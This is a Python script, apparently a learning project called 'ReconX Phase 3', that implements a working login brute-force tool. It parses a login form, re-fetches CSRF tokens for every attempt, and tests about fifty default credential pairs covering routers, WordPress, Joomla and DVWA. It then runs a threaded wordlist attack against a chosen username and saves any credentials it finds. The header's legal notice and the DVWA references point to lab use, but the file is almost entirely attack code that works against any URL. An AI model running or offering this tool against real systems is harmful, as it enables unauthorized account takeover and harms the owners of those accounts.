#!/usr/bin/env python3
"""
ReconX — Day 3: Password Attacks
Author: Jay Sharma (github.com/jay-sharma-sec)
Description: Phase 3 of ReconX — login page analysis, default credential
             testing, and wordlist-based brute forcing with threading.

LEGAL NOTICE: Only use against systems you own or have explicit written
permission to test. Unauthorized access is illegal under the Computer
Fraud and Abuse Act and equivalent laws worldwide.
"""

import requests
import threading
import argparse
import datetime
import time
from queue import Queue
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# ── Colours ──────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════╗
║   ReconX — Password Attacks             ║
║   Phase 3: Default Creds + BruteForce  ║
║   github.com/jay-sharma-sec             ║
╚══════════════════════════════════════════╝{RESET}
""")

# ─────────────────────────────────────────────────────────────────────────────
# DEFAULT CREDENTIALS LIST
# These are real default credentials used by common web apps, routers,
# and CMS platforms. Shocking numbers of production systems never change these.
# Source: compiled from public security research and CVE disclosures.
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_CREDENTIALS = [
    # Generic defaults — most common across all platforms
    ("admin",          "admin"),
    ("admin",          "password"),
    ("admin",          "1234"),
    ("admin",          "12345"),
    ("admin",          "123456"),
    ("admin",          "admin123"),
    ("admin",          ""),
    ("administrator",  "administrator"),
    ("administrator",  "password"),
    ("administrator",  "admin"),
    ("root",           "root"),
    ("root",           "toor"),
    ("root",           "password"),
    ("root",           ""),
    ("user",           "user"),
    ("user",           "password"),
    ("guest",          "guest"),
    ("guest",          ""),
    ("test",           "test"),
    ("demo",           "demo"),

    # DVWA specific
    ("admin",          "password"),
    ("gordonb",        "abc123"),
    ("1337",           "charley"),
    ("pablo",          "letmein"),
    ("smithy",         "password"),

    # WordPress defaults
    ("admin",          "admin"),
    ("wordpress",      "wordpress"),

    # Joomla defaults
    ("admin",          "admin"),
    ("super",          "super"),

    # Router/device defaults
    ("admin",          "admin"),
    ("admin",          "1234"),
    ("admin",          "password"),
    ("admin",          "motorola"),
    ("admin",          "comcast"),
    ("cusadmin",       "highspeed"),
    ("user",           "user"),

    # Common weak passwords with admin
    ("admin",          "qwerty"),
    ("admin",          "letmein"),
    ("admin",          "welcome"),
    ("admin",          "monkey"),
    ("admin",          "dragon"),
    ("admin",          "master"),
    ("admin",          "123456789"),
    ("admin",          "iloveyou"),
    ("admin",          "sunshine"),
    ("admin",          "princess"),
]

# ─────────────────────────────────────────────────────────────────────────────
# BUILT-IN WORDLIST
# A compact but effective password wordlist based on real breach data.
# Real tools use lists like rockyou.txt (14 million passwords) — this gives
# you the most impactful entries without requiring a download.
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_WORDLIST = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine", "ashley",
    "bailey", "passw0rd", "shadow", "123123", "654321",
    "superman", "qazwsx", "michael", "football", "password1",
    "password123", "admin", "admin123", "root", "toor",
    "pass", "test", "1234", "12345", "123456789", "000000",
    "111111", "666666", "888888", "1111111", "12345678",
    "qwerty123", "1q2w3e4r", "zxcvbnm", "asdfghjkl",
    "welcome", "login", "hello", "charlie", "donald",
    "password2", "qwerty1", "1qaz2wsx", "q1w2e3r4",
    "passpass", "pass1234", "p@ssword", "p@ss123",
    "Admin1234", "admin@123", "Admin@123", "Pa$$word",
]

# ─────────────────────────────────────────────────────────────────────────────
# STEP 1 — Login Page Analyser
# Why: Before attacking, we need to understand the login form structure.
#      Every login form has different field names (some use "username",
#      others use "email", "user", "login" etc.) We also need to:
#      1. Find CSRF tokens — security tokens that must be submitted with
#         each request to prove the request came from a real browser
#      2. Identify what a FAILED login looks like (error message) so we
#         can detect when a login SUCCEEDS
# ─────────────────────────────────────────────────────────────────────────────
def analyse_login_form(url, session):
    """
    Fetch the login page and extract:
    - Form action URL (where credentials are submitted)
    - Username field name
    - Password field name
    - Any hidden fields (CSRF tokens etc.)
    - A failed login fingerprint (error message text)
    """
    print(f"\n{CYAN}[*] Analysing login form at {url}...{RESET}")

    try:
        resp = session.get(url, timeout=8)
        soup = BeautifulSoup(resp.content, "html.parser")

        # Find all forms on the page
        forms = soup.find_all("form")
        if not forms:
            print(f"{RED}[-] No forms found on page.{RESET}")
            return None

        # Use the first form (most login pages have one main form)
        form = forms[0]

        # Get form action — where it submits to
        action = form.attrs.get("action", url)
        action_url = urljoin(url, action)

        # Find all input fields
        inputs = form.find_all("input")

        user_field = None
        pass_field = None
        hidden_fields = {}

        # Common names for username/email fields
        user_field_names = ["username", "user", "email", "login",
                           "uname", "userid", "user_name", "usr"]
        # Common names for password fields
        pass_field_names = ["password", "pass", "passwd", "pwd",
                           "passw", "user_password", "pword"]

        for inp in inputs:
            inp_type = inp.attrs.get("type", "text").lower()
            inp_name = inp.attrs.get("name", "").lower()

            if inp_type == "hidden":
                # Capture ALL hidden fields — these include CSRF tokens
                # We must submit these with every login attempt
                name  = inp.attrs.get("name", "")
                value = inp.attrs.get("value", "")
                hidden_fields[name] = value
                if name:
                    print(f"{YELLOW}[~] Hidden field found: {name} = {value[:30]}{'...' if len(value) > 30 else ''}{RESET}")
                    if any(csrf in name.lower() for csrf in ["csrf", "token", "nonce", "_token"]):
                        print(f"{RED}[!] CSRF token detected — will refresh per request{RESET}")

            elif inp_type == "password" or inp_name in pass_field_names:
                pass_field = inp.attrs.get("name", "password")
                print(f"{GREEN}[+] Password field: '{pass_field}'{RESET}")

            elif inp_type == "text" or inp_name in user_field_names:
                if not user_field:
                    user_field = inp.attrs.get("name", "username")
                    print(f"{GREEN}[+] Username field: '{user_field}'{RESET}")

        if not user_field:
            user_field = "username"
            print(f"{YELLOW}[~] Username field not detected — defaulting to 'username'{RESET}")
        if not pass_field:
            pass_field = "password"
            print(f"{YELLOW}[~] Password field not detected — defaulting to 'password'{RESET}")

        print(f"{GREEN}[+] Form submits to: {action_url}{RESET}")

        # Get the submit button name/value if present — some forms need it
        submit_btn = form.find("input", {"type": "submit"})
        submit_field = {}
        if submit_btn:
            btn_name  = submit_btn.attrs.get("name")
            btn_value = submit_btn.attrs.get("value", "Login")
            if btn_name:
                submit_field[btn_name] = btn_value

        form_info = {
            "action":        action_url,
            "user_field":    user_field,
            "pass_field":    pass_field,
            "hidden_fields": hidden_fields,
            "submit_field":  submit_field,
            "method":        form.attrs.get("method", "post").lower(),
            "has_csrf":      any("csrf" in k.lower() or "token" in k.lower()
                                 for k in hidden_fields.keys()),
        }

        return form_info

    except requests.RequestException as e:
        print(f"{RED}[-] Could not analyse login form: {e}{RESET}")
        return None

# ─────────────────────────────────────────────────────────────────────────────
# STEP 2 — Fingerprint a failed login
# Why: We need to know what a WRONG password response looks like so we can
#      detect when we get a CORRECT password response (different response).
#      Common failure indicators: "Invalid credentials", "Login failed",
#      "Wrong password", or a redirect back to the login page.
# ─────────────────────────────────────────────────────────────────────────────
def get_failure_fingerprint(url, form_info, session):
    """
    Submit a deliberately wrong login and record the response characteristics.
    We use this as the baseline — any response that differs significantly
    from this baseline is a potential successful login.
    """
    print(f"\n{CYAN}[*] Fingerprinting failed login response...{RESET}")

    # Use an obviously wrong password
    data = {
        form_info["user_field"]: "definitelynotauser_xyz123",
        form_info["pass_field"]: "definitelywrongpassword_xyz123",
        **form_info["hidden_fields"],
        **form_info["submit_field"],
    }

    try:
        resp = session.post(form_info["action"], data=data, timeout=8,
                           allow_redirects=True)

        fingerprint = {
            "status_code":   resp.status_code,
            "content_length": len(resp.content),
            "url":           resp.url,
            "text_sample":   resp.text[:500].lower(),
        }

        # Common failure message indicators
        failure_keywords = [
            "invalid", "incorrect", "wrong", "failed", "error",
            "denied", "unauthori", "bad credentials", "try again",
            "login failed", "username or password"
        ]

        detected_keyword = None
        for kw in failure_keywords:
            if kw in fingerprint["text_sample"]:
                detected_keyword = kw
                break

        fingerprint["failure_keyword"] = detected_keyword
        print(f"{GREEN}[+] Failed login: HTTP {fingerprint['status_code']} | "
              f"Size: {fingerprint['content_length']}B | "
              f"Keyword: '{detected_keyword}'{RESET}")

        return fingerprint

    except requests.RequestException as e:
        print(f"{RED}[-] Could not fingerprint failure: {e}{RESET}")
        return None

# ─────────────────────────────────────────────────────────────────────────────
# STEP 3 — Attempt a single login
# Returns True if login appears successful, False otherwise.
# ─────────────────────────────────────────────────────────────────────────────
def attempt_login(url, form_info, username, password, failure_fp, session):
    """
    Submit a login attempt and compare the response to the failure fingerprint.
    A login is considered successful if:
    1. Response URL changed significantly (redirected to dashboard)
    2. Response size differs notably from failed login
    3. Failure keyword is absent from response
    """
    # If the form has CSRF tokens, we need to fetch a fresh token
    # before EVERY attempt — the server generates a new one each page load
    hidden = dict(form_info["hidden_fields"])

    if form_info.get("has_csrf"):
        try:
            fresh = session.get(url, timeout=5)
            soup  = BeautifulSoup(fresh.content, "html.parser")
            for inp in soup.find_all("input", {"type": "hidden"}):
                name  = inp.attrs.get("name", "")
                value = inp.attrs.get("value", "")
                if name:
                    hidden[name] = value
        except Exception:
            pass

    data = {
        form_info["user_field"]: username,
        form_info["pass_field"]: password,
        **hidden,
        **form_info["submit_field"],
    }

    try:
        resp = session.post(form_info["action"], data=data, timeout=8,
                           allow_redirects=True)

        # Detection logic — compare to failure fingerprint
        url_changed     = resp.url != failure_fp["url"]
        size_diff       = abs(len(resp.content) - failure_fp["content_length"])
        size_changed    = size_diff > 200  # More than 200 bytes difference
        keyword_present = (failure_fp["failure_keyword"] and
                          failure_fp["failure_keyword"] in resp.text.lower())

        # Success conditions:
        # - URL changed (redirected away from login page) AND
        # - Failure keyword not present in response
        success = url_changed and not keyword_present

        # Also check for explicit success indicators
        success_keywords = ["dashboard", "welcome", "logout",
                           "profile", "account", "index.php?"]
        explicit_success = any(kw in resp.url.lower() or kw in resp.text.lower()[:500]
                              for kw in success_keywords)

        return success or explicit_success, resp

    except requests.RequestException:
        return False, None

# ─────────────────────────────────────────────────────────────────────────────
# STEP 4 — Default Credentials Checker
# ─────────────────────────────────────────────────────────────────────────────
def check_default_credentials(url, form_info, failure_fp):
    """
    Try every default credential pair against the login form.
    Uses a fresh session per attempt to avoid session contamination.
    Not threaded — we want a small delay between attempts to avoid lockouts.
    """
    print(f"\n{CYAN}[*] Testing {len(DEFAULT_CREDENTIALS)} default credential pairs...{RESET}")
    found = []

    for i, (username, password) in enumerate(DEFAULT_CREDENTIALS, 1):
        session = requests.Session()
        success, resp = attempt_login(url, form_info, username, password,
                                     failure_fp, session)

        if success:
            print(f"{RED}{BOLD}[!!!] DEFAULT CREDENTIALS FOUND!{RESET}")
            print(f"{RED}      Username: {username}{RESET}")
            print(f"{RED}      Password: {password}{RESET}")
            if resp:
                print(f"{RED}      Redirected to: {resp.url}{RESET}")
            found.append((username, password))
        else:
            # Progress indicator every 10 attempts
            if i % 10 == 0:
                print(f"{YELLOW}[~] Tested {i}/{len(DEFAULT_CREDENTIALS)} pairs...{RESET}")

        # Small delay between attempts — avoids triggering rate limiting
        # and mimics more realistic human timing
        time.sleep(0.1)

    if not found:
        print(f"{GREEN}[OK] No default credentials worked.{RESET}")

    return found

# ─────────────────────────────────────────────────────────────────────────────
# STEP 5 — Wordlist Brute Forcer
# Uses threading for speed — multiple password attempts simultaneously.
# ─────────────────────────────────────────────────────────────────────────────

# Shared state across threads
brute_found    = []
brute_lock     = threading.Lock()
stop_flag      = threading.Event()  # Signal all threads to stop when found

def brute_worker(url, form_info, failure_fp, username, queue, delay):
    """
    Worker thread — grabs passwords from the queue and tries them.
    Stops immediately if another thread finds valid credentials.
    """
    while not queue.empty() and not stop_flag.is_set():
        try:
            password = queue.get(timeout=1)
        except Exception:
            break

        session = requests.Session()
        success, resp = attempt_login(url, form_info, username, password,
                                     failure_fp, session)

        if success:
            with brute_lock:
                brute_found.append((username, password))
                stop_flag.set()  # Tell all other threads to stop

            print(f"\n{RED}{BOLD}[!!!] VALID CREDENTIALS FOUND!{RESET}")
            print(f"{RED}      Username: {username}{RESET}")
            print(f"{RED}      Password: {password}{RESET}")
            if resp:
                print(f"{RED}      Redirected to: {resp.url}{RESET}")
        else:
            print(f"{YELLOW}[-] {username}:{password}{RESET}", end="\r")

        time.sleep(delay)
        queue.task_done()

def wordlist_bruteforce(url, form_info, failure_fp, username,
                        wordlist, max_threads=5, delay=0.2):
    """
    Brute force the login with a wordlist using multiple threads.
    Default is 5 threads with 0.2s delay — fast enough to be useful
    but slow enough to avoid rate limiting on most targets.
    """
    print(f"\n{CYAN}[*] Starting wordlist brute force...{RESET}")
    print(f"{CYAN}[*] Target username: {username}{RESET}")
    print(f"{CYAN}[*] Wordlist size: {len(wordlist)} passwords{RESET}")
    print(f"{CYAN}[*] Threads: {max_threads} | Delay: {delay}s{RESET}\n")

    queue = Queue()
    for password in wordlist:
        queue.put(password)

    stop_flag.clear()

    threads = []
    for _ in range(min(max_threads, len(wordlist))):
        t = threading.Thread(
            target=brute_worker,
            args=(url, form_info, failure_fp, username, queue, delay)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not brute_found:
        print(f"\n{GREEN}[OK] No valid credentials found in wordlist.{RESET}")

    return brute_found

# ─────────────────────────────────────────────────────────────────────────────
# STEP 6 — Save Report
# ─────────────────────────────────────────────────────────────────────────────
def save_report(target, default_found, brute_found_list, username):
    """Save all Day 3 findings to a timestamped report."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"reconx_day3_report_{timestamp}.txt"

    with open(filename, "w") as f:
        f.write("=" * 60 + "\n")
        f.write("ReconX — Password Attack Report\n")
        f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Target: {target}\n\n")

        f.write("-" * 60 + "\n")
        f.write("DEFAULT CREDENTIALS FOUND\n")
        f.write("-" * 60 + "\n")
        if default_found:
            for user, pwd in default_found:
                f.write(f"  {user}:{pwd}\n")
        else:
            f.write("  None found.\n")

        f.write("\n" + "-" * 60 + "\n")
        f.write(f"BRUTE FORCE RESULTS (username: {username})\n")
        f.write("-" * 60 + "\n")
        if brute_found_list:
            for user, pwd in brute_found_list:
                f.write(f"  {user}:{pwd}\n")
        else:
            f.write("  None found.\n")

        f.write("\n" + "=" * 60 + "\n")
        f.write("Always test only on targets you own or have permission to test.\n")

    print(f"\n{GREEN}[+] Report saved: {filename}{RESET}")

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="ReconX Phase 3 — Password Attacks",
        epilog="Example: python3 reconx_day3.py -u http://localhost:8080/login.php -U admin"
    )
    parser.add_argument("-u",  "--url",       required=True,
                        help="Target login page URL")
    parser.add_argument("-U",  "--username",  default="admin",
                        help="Username to brute force (default: admin)")
    parser.add_argument("-w",  "--wordlist",  default=None,
                        help="Path to wordlist file (one password per line). Uses built-in list if not specified.")
    parser.add_argument("--threads",          default=5, type=int,
                        help="Threads for brute force (default: 5, keep low to avoid lockout)")
    parser.add_argument("--delay",            default=0.2, type=float,
                        help="Delay between attempts in seconds (default: 0.2)")
    parser.add_argument("--skip-defaults",    action="store_true",
                        help="Skip default credentials check")
    parser.add_argument("--skip-brute",       action="store_true",
                        help="Skip wordlist brute force")
    parser.add_argument("--no-report",        action="store_true",
                        help="Skip saving report")

    args = parser.parse_args()

    banner()
    print(f"{CYAN}[*] Target: {args.url}{RESET}")

    # Use a persistent session for the analysis phase
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ReconX Scanner)"})

    # Step 1 — Analyse the login form
    form_info = analyse_login_form(args.url, session)
    if not form_info:
        print(f"{RED}[-] Could not analyse login form. Exiting.{RESET}")
        return

    # Step 2 — Fingerprint failed login
    failure_fp = get_failure_fingerprint(args.url, form_info, session)
    if not failure_fp:
        print(f"{RED}[-] Could not fingerprint failure response. Exiting.{RESET}")
        return

    # Step 3 — Default credentials
    default_found = []
    if not args.skip_defaults:
        default_found = check_default_credentials(args.url, form_info, failure_fp)

    # Step 4 — Wordlist brute force
    brute_results = []
    if not args.skip_brute:
        # Load wordlist from file or use built-in
        wordlist = BUILTIN_WORDLIST
        if args.wordlist:
            try:
                with open(args.wordlist, "r", errors="ignore") as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                print(f"{GREEN}[+] Loaded {len(wordlist)} passwords from {args.wordlist}{RESET}")
            except FileNotFoundError:
                print(f"{YELLOW}[~] Wordlist file not found — using built-in list{RESET}")

        brute_results = wordlist_bruteforce(
            args.url, form_info, failure_fp,
            args.username, wordlist,
            args.threads, args.delay
        )

    # Step 5 — Report
    if not args.no_report:
        save_report(args.url, default_found, brute_results, args.username)

    # Summary
    print(f"\n{'─' * 50}")
    total_found = len(default_found) + len(brute_results)
    if total_found > 0:
        print(f"{RED}{BOLD}[!!!] {total_found} valid credential(s) found — check report{RESET}")
    else:
        print(f"{GREEN}[*] No valid credentials found.{RESET}")
    print(f"{'─' * 50}\n")

if __name__ == "__main__":
    main()
